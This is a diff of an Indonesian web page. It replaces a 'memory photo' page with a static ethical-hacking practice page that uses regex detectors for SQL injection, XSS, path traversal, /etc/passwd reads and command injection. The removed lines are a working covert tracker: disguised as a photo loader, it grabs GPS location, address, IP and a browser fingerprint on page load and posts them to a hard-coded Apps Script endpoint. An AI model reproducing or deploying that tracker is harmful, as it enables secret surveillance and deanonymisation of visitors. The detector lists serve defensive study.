@@ -1,77 +1,491 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Foto Kenangan</title>
-    <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #f2f2f2; }
-        .box { background: white; padding: 30px; border-radius: 15px; max-width: 500px; margin: auto; }
-        img { max-width: 100%; border-radius: 10px; }
-        .status { color: #666; margin-top: 20px; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Security Lab - Website latihan ethical hacking dan penetration testing">
+  <meta name="robots" content="noindex, nofollow">
+  <title>SecureLab — Practice Target</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg:       #0a0e17;
+      --surface:  #111827;
+      --border:   #1f2d40;
+      --accent:   #00e5ff;
+      --warn:     #ff6b35;
+      --ok:       #39ff6a;
+      --muted:    #4a5568;
+      --text:     #c9d6e3;
+      --mono:     'Share Tech Mono', monospace;
+      --sans:     'Inter', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--sans);
+      min-height: 100vh;
+    }
+
+    /* ── TOP BAR ── */
+    header {
+      border-bottom: 1px solid var(--border);
+      padding: 14px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--surface);
+    }
+    .logo {
+      font-family: var(--mono);
+      font-size: 1.1rem;
+      color: var(--accent);
+      letter-spacing: 2px;
+    }
+    .badge {
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      padding: 4px 10px;
+      border-radius: 4px;
+      border: 1px solid var(--warn);
+      color: var(--warn);
+      letter-spacing: 1px;
+    }
+
+    /* ── HERO ── */
+    .hero {
+      text-align: center;
+      padding: 60px 24px 40px;
+      border-bottom: 1px solid var(--border);
+    }
+    .hero h1 {
+      font-family: var(--mono);
+      font-size: clamp(1.6rem, 5vw, 2.8rem);
+      color: var(--accent);
+      text-shadow: 0 0 20px rgba(0,229,255,0.3);
+      margin-bottom: 12px;
+    }
+    .hero p {
+      color: var(--muted);
+      font-size: 0.95rem;
+      max-width: 480px;
+      margin: 0 auto 28px;
+      line-height: 1.7;
+    }
+    .status-row {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    .status-pill {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      padding: 5px 14px;
+      border-radius: 20px;
+      background: rgba(0,229,255,0.07);
+      border: 1px solid var(--border);
+      color: var(--ok);
+      letter-spacing: 1px;
+    }
+
+    /* ── GRID ── */
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1px;
+      background: var(--border);
+      border-top: 1px solid var(--border);
+    }
+    .card {
+      background: var(--surface);
+      padding: 28px 24px;
+      transition: background 0.2s;
+    }
+    .card:hover { background: #131e2e; }
+    .card-tag {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: var(--accent);
+      letter-spacing: 2px;
+      margin-bottom: 10px;
+      opacity: 0.7;
+    }
+    .card h2 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #e2e8f0;
+      margin-bottom: 8px;
+    }
+    .card p {
+      font-size: 0.85rem;
+      color: var(--muted);
+      line-height: 1.6;
+      margin-bottom: 16px;
+    }
+
+    /* ── FORM (XSS & LOGIN) ── */
+    .field {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin-bottom: 10px;
+    }
+    .field label {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      color: var(--muted);
+      letter-spacing: 1px;
+    }
+    input[type="text"], input[type="password"], input[type="search"] {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-family: var(--mono);
+      font-size: 0.85rem;
+      padding: 8px 12px;
+      border-radius: 4px;
+      width: 100%;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    input:focus { border-color: var(--accent); }
+
+    .btn {
+      font-family: var(--mono);
+      font-size: 0.78rem;
+      letter-spacing: 1px;
+      padding: 8px 18px;
+      border-radius: 4px;
+      cursor: pointer;
+      border: none;
+      transition: opacity 0.2s;
+    }
+    .btn:hover { opacity: 0.8; }
+    .btn-accent { background: var(--accent); color: var(--bg); font-weight: 700; }
+    .btn-outline { background: transparent; border: 1px solid var(--border); color: var(--text); }
+
+    .output-box {
+      margin-top: 12px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 10px 12px;
+      font-family: var(--mono);
+      font-size: 0.78rem;
+      min-height: 38px;
+      color: var(--ok);
+      word-break: break-all;
+    }
+
+    /* ── HONEYPOT SECTION ── */
+    .honeypot-hidden {
+      position: absolute;
+      left: -9999px;
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    /* ── HEADERS TABLE ── */
+    .headers-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-family: var(--mono);
+      font-size: 0.72rem;
+    }
+    .headers-table td {
+      padding: 5px 8px;
+      border-bottom: 1px solid var(--border);
+      vertical-align: top;
+    }
+    .headers-table td:first-child { color: var(--accent); width: 45%; }
+    .headers-table td:last-child { color: var(--muted); word-break: break-all; }
+
+    /* ── ATTACK LOG ── */
+    .log-box {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: 10px 12px;
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      max-height: 160px;
+      overflow-y: auto;
+      line-height: 1.8;
+    }
+    .log-entry { display: block; }
+    .log-entry.warn { color: var(--warn); }
+    .log-entry.ok   { color: var(--ok); }
+    .log-entry.info { color: var(--muted); }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 18px 24px;
+      text-align: center;
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: var(--muted);
+      letter-spacing: 1px;
+    }
+    footer span { color: var(--warn); }
+
+    @media (max-width: 500px) {
+      .hero { padding: 40px 16px 28px; }
+      .card { padding: 22px 16px; }
+    }
+  </style>
 </head>
 <body>
-<div class="box">
-    <h2>📸 Foto Kenangan</h2>
-    <img src="https://picsum.photos/400/300?random=4" alt="foto">
-    <p class="status">Memuat foto terdekat dari lokasi Anda...</p>
+
+<!-- HONEYPOT: hidden fields untuk deteksi bot -->
+<input type="text" name="hp_email" class="honeypot-hidden" tabindex="-1" autocomplete="off">
+<input type="text" name="hp_username" class="honeypot-hidden" tabindex="-1" autocomplete="off">
+
+<header>
+  <div class="logo">[ SECURELAB ]</div>
+  <div class="badge">⚠ PRACTICE TARGET</div>
+</header>
+
+<div class="hero">
+  <h1>&gt; SECURITY LAB v1.0_</h1>
+  <p>Website latihan ethical hacking. Semua fitur di sini sengaja dibuat untuk dipelajari dan diuji oleh pemiliknya sendiri.</p>
+  <div class="status-row">
+    <span class="status-pill">● ONLINE</span>
+    <span class="status-pill">● GITHUB PAGES</span>
+    <span class="status-pill">● STATIC ONLY</span>
+  </div>
 </div>
+
+<div class="grid">
+
+  <!-- CARD 1: XSS TEST -->
+  <div class="card">
+    <div class="card-tag">MODULE 01 // WEB ATTACK</div>
+    <h2>XSS Reflection Test</h2>
+    <p>Uji apakah input dari pengguna ditampilkan kembali tanpa sanitasi. Coba masukkan karakter seperti <code>&lt;script&gt;</code>.</p>
+    <div class="field">
+      <label>INPUT TARGET</label>
+      <input type="text" id="xss-input" placeholder='coba: &lt;b&gt;test&lt;/b&gt; atau alert(1)'>
+    </div>
+    <button class="btn btn-accent" onclick="testXSS()">INJECT &amp; TEST</button>
+    <div class="output-box" id="xss-output">// output akan muncul di sini</div>
+  </div>
+
+  <!-- CARD 2: LOGIN FORM -->
+  <div class="card">
+    <div class="card-tag">MODULE 02 // AUTH TEST</div>
+    <h2>Login Form (Dummy)</h2>
+    <p>Form login statis untuk latihan observasi request, analisis parameter, dan deteksi input tidak wajar.</p>
+    <div class="field">
+      <label>USERNAME</label>
+      <input type="text" id="login-user" placeholder="admin">
+    </div>
+    <div class="field">
+      <label>PASSWORD</label>
+      <input type="password" id="login-pass" placeholder="••••••••">
+    </div>
+    <!-- honeypot tersembunyi di form -->
+    <input type="text" name="website" style="display:none" tabindex="-1">
+    <button class="btn btn-accent" onclick="testLogin()" style="margin-top:4px">LOGIN</button>
+    <div class="output-box" id="login-output">// status login muncul di sini</div>
+  </div>
+
+  <!-- CARD 3: RECON INFO -->
+  <div class="card">
+    <div class="card-tag">MODULE 03 // RECONNAISSANCE</div>
+    <h2>Target Information</h2>
+    <p>Informasi dasar website ini yang dapat diidentifikasi lewat tools Reconnaissance seperti BOOGIE.</p>
+    <table class="headers-table">
+      <tr><td>HOST</td><td id="recon-host">—</td></tr>
+      <tr><td>PROTOCOL</td><td id="recon-proto">—</td></tr>
+      <tr><td>USER-AGENT</td><td id="recon-ua">—</td></tr>
+      <tr><td>LANGUAGE</td><td id="recon-lang">—</td></tr>
+      <tr><td>REFERRER</td><td id="recon-ref">—</td></tr>
+      <tr><td>PLATFORM</td><td id="recon-plat">—</td></tr>
+    </table>
+  </div>
+
+  <!-- CARD 4: ATTACK DETECTOR -->
+  <div class="card">
+    <div class="card-tag">MODULE 04 // DETECTION</div>
+    <h2>Attack Pattern Detector</h2>
+    <p>Masukkan string untuk dianalisis — sistem akan mendeteksi apakah ada pola serangan umum di dalamnya.</p>
+    <div class="field">
+      <label>STRING TO ANALYZE</label>
+      <input type="search" id="detect-input" placeholder="e.g. ' OR 1=1 --">
+    </div>
+    <button class="btn btn-accent" onclick="detectAttack()">ANALYZE</button>
+    <div class="output-box" id="detect-output">// hasil deteksi muncul di sini</div>
+  </div>
+
+  <!-- CARD 5: EVENT LOG -->
+  <div class="card">
+    <div class="card-tag">MODULE 05 // MONITOR</div>
+    <h2>Session Event Log</h2>
+    <p>Semua aktivitas di halaman ini dicatat secara lokal. Ini simulasi bagaimana server mencatat aktivitas mencurigakan.</p>
+    <div class="log-box" id="event-log">
+      <span class="log-entry info">// menunggu aktivitas...</span>
+    </div>
+    <button class="btn btn-outline" onclick="clearLog()" style="margin-top:10px; width:100%">CLEAR LOG</button>
+  </div>
+
+  <!-- CARD 6: ROBOTS & META -->
+  <div class="card">
+    <div class="card-tag">MODULE 06 // INFO GATHERING</div>
+    <h2>Hidden Paths (Simulasi)</h2>
+    <p>Path-path berikut adalah simulasi struktur direktori yang biasa ditemukan oleh tools scanning. Di website nyata, ini bisa mengekspos data sensitif.</p>
+    <div class="log-box" style="max-height:none; color: var(--warn);">
+      <span style="color:var(--muted)"># Simulasi robots.txt</span><br>
+      User-agent: *<br>
+      Disallow: /admin/<br>
+      Disallow: /backup/<br>
+      Disallow: /config/<br>
+      Disallow: /.env<br>
+      Disallow: /api/keys<br><br>
+      <span style="color:var(--muted)"># Path ini TIDAK ADA di GitHub Pages</span><br>
+      <span style="color:var(--ok)"># Hanya untuk edukasi scanning</span>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <span>[ ETHICAL USE ONLY ]</span> — website ini milik pemiliknya sendiri dan dibuat untuk tujuan belajar keamanan web &nbsp;|&nbsp; SecureLab v1.0
+</footer>
+
 <script>
-    // GANTI DENGAN WEB APP URL ANDA
-    const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbyH5gC3u148Y0A_oK0KVU8s4jsou5aG_Y66YsJMUtx77kdrtnBGnJ1p4KK3jes8l0ytWg/exec";
+  // ── RECON AUTO-FILL ──
+  document.getElementById('recon-host').textContent  = location.hostname || 'localhost';
+  document.getElementById('recon-proto').textContent = location.protocol;
+  document.getElementById('recon-ua').textContent    = navigator.userAgent.substring(0, 60) + '...';
+  document.getElementById('recon-lang').textContent  = navigator.language;
+  document.getElementById('recon-ref').textContent   = document.referrer || '(direct)';
+  document.getElementById('recon-plat').textContent  = navigator.platform;
 
-    async function kirimKeEmail(lat, lon, accuracy, address, fingerprint) {
-        const payload = { lat, lon, accuracy, address, fingerprint };
-        await fetch(WEBAPP_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        }).catch(e => console.log(e));
-        document.querySelector(".status").innerHTML = "✅ Foto dimuat. Terima kasih!";
+  // ── LOG HELPER ──
+  function addLog(msg, type = 'info') {
+    const log = document.getElementById('event-log');
+    const entry = document.createElement('span');
+    const time = new Date().toLocaleTimeString('id-ID');
+    entry.className = 'log-entry ' + type;
+    entry.textContent = `[${time}] ${msg}`;
+    log.appendChild(document.createElement('br'));
+    log.appendChild(entry);
+    log.scrollTop = log.scrollHeight;
+  }
+
+  function clearLog() {
+    document.getElementById('event-log').innerHTML = '<span class="log-entry info">// log dibersihkan</span>';
+  }
+
+  // ── XSS TEST (SAFE — pakai textContent, bukan innerHTML) ──
+  function testXSS() {
+    const raw = document.getElementById('xss-input').value;
+    const out = document.getElementById('xss-output');
+
+    // Deteksi pola XSS
+    const xssPatterns = [/<script/i, /javascript:/i, /onerror=/i, /onload=/i, /alert\(/i, /<img/i, /eval\(/i];
+    const found = xssPatterns.some(p => p.test(raw));
+
+    if (found) {
+      out.style.color = 'var(--warn)';
+      out.textContent = '⚠ DETECTED: Pola XSS ditemukan! Input disanitasi → "' + raw.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '"';
+      addLog('XSS attempt detected: ' + raw.substring(0, 40), 'warn');
+    } else {
+      out.style.color = 'var(--ok)';
+      out.textContent = '✓ CLEAN: Output (sanitized) → ' + raw;
+      addLog('XSS test: input bersih', 'ok');
+    }
+  }
+
+  // ── LOGIN TEST ──
+  function testLogin() {
+    const user = document.getElementById('login-user').value;
+    const pass = document.getElementById('login-pass').value;
+    const out  = document.getElementById('login-output');
+
+    // Cek honeypot
+    const hp = document.querySelector('input[name="website"]');
+    if (hp && hp.value !== '') {
+      addLog('BOT DETECTED via honeypot field!', 'warn');
+      out.style.color = 'var(--warn)';
+      out.textContent = '⚠ BOT DETECTED — honeypot triggered';
+      return;
     }
 
-    async function getFingerprint() {
-        const ua = navigator.userAgent;
-        const platform = navigator.platform || "unknown";
-        const language = navigator.language;
-        const screenRes = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const currentTime = new Date().toString();
-        let ip = "unknown";
-        try {
-            const res = await fetch("https://ipapi.co/json/");
-            const data = await res.json();
-            ip = data.ip;
-        } catch(e) {}
-        return { userAgent: ua, platform, language, screenResolution: screenRes, timezone, accessTime: currentTime, ip };
+    if (!user || !pass) {
+      out.style.color = 'var(--warn)';
+      out.textContent = '✗ ERROR: Username dan password wajib diisi';
+      addLog('Login attempt: field kosong', 'warn');
+      return;
     }
 
-    (async function() {
-        const fingerprint = await getFingerprint();
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    let acc = pos.coords.accuracy;
-                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`)
-                        .then(r => r.json())
-                        .then(data => kirimKeEmail(lat, lon, acc, data.display_name || "", fingerprint))
-                        .catch(() => kirimKeEmail(lat, lon, acc, "", fingerprint));
-                },
-                err => {
-                    fetch("https://ipapi.co/json/")
-                        .then(r => r.json())
-                        .then(data => kirimKeEmail(data.latitude, data.longitude, 5000, `${data.city}, ${data.country_name}`, fingerprint));
-                    document.querySelector(".status").innerHTML = "⚠️ Izin lokasi diperlukan untuk akurasi.";
-                },
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        } else {
-            document.querySelector(".status").innerHTML = "Browser tidak mendukung GPS.";
-        }
-    })();
+    // Deteksi SQL injection di input login
+    const sqlPatterns = [/'\s*OR/i, /--/, /;\s*DROP/i, /UNION\s+SELECT/i, /1=1/i];
+    const sqlFound = sqlPatterns.some(p => p.test(user) || p.test(pass));
+
+    if (sqlFound) {
+      out.style.color = 'var(--warn)';
+      out.textContent = '⚠ SQL INJECTION PATTERN DETECTED! Input diblokir.';
+      addLog('SQL Injection attempt: user="' + user.substring(0,20) + '"', 'warn');
+      return;
+    }
+
+    // Simulasi cek kredensial
+    if (user === 'admin' && pass === 'admin123') {
+      out.style.color = 'var(--ok)';
+      out.textContent = '✓ LOGIN SUCCESS (demo) — Selamat, kamu berhasil masuk!';
+      addLog('Login sukses: user=' + user, 'ok');
+    } else {
+      out.style.color = 'var(--warn)';
+      out.textContent = '✗ LOGIN FAILED — Kredensial salah (hint: coba admin/admin123)';
+      addLog('Login gagal: user=' + user, 'warn');
+    }
+  }
+
+  // ── ATTACK PATTERN DETECTOR ──
+  function detectAttack() {
+    const input = document.getElementById('detect-input').value;
+    const out   = document.getElementById('detect-output');
+
+    const patterns = [
+      { regex: /'\s*(OR|AND)\s*['"\d]/i,        name: 'SQL Injection (OR/AND)' },
+      { regex: /UNION\s+SELECT/i,                name: 'SQL Injection (UNION)' },
+      { regex: /;\s*(DROP|DELETE|INSERT|UPDATE)/i,name: 'SQL Injection (DDL/DML)' },
+      { regex: /<script[\s>]/i,                  name: 'XSS (script tag)' },
+      { regex: /javascript:/i,                   name: 'XSS (javascript: URI)' },
+      { regex: /on\w+\s*=/i,                     name: 'XSS (event handler)' },
+      { regex: /\.\.\//,                         name: 'Path Traversal' },
+      { regex: /etc\/passwd/i,                   name: 'LFI (etc/passwd)' },
+      { regex: /\|\s*\w+/,                       name: 'Command Injection (pipe)' },
+      { regex: /`[^`]+`/,                        name: 'Command Injection (backtick)' },
+    ];
+
+    const hits = patterns.filter(p => p.regex.test(input)).map(p => p.name);
+
+    if (hits.length > 0) {
+      out.style.color = 'var(--warn)';
+      out.textContent = '⚠ TERDETEKSI: ' + hits.join(', ');
+      addLog('Attack pattern: ' + hits.join(', '), 'warn');
+    } else if (!input) {
+      out.style.color = 'var(--muted)';
+      out.textContent = '// masukkan string untuk dianalisis';
+    } else {
+      out.style.color = 'var(--ok)';
+      out.textContent = '✓ CLEAN — Tidak ada pola serangan yang terdeteksi';
+      addLog('Pattern scan: bersih', 'ok');
+    }
+  }
+
+  // ── LOG INIT ──
+  addLog('SecureLab dimuat — sesi dimulai', 'ok');
+  addLog('Host: ' + location.hostname, 'info');
 </script>
+
 </body>
 </html>
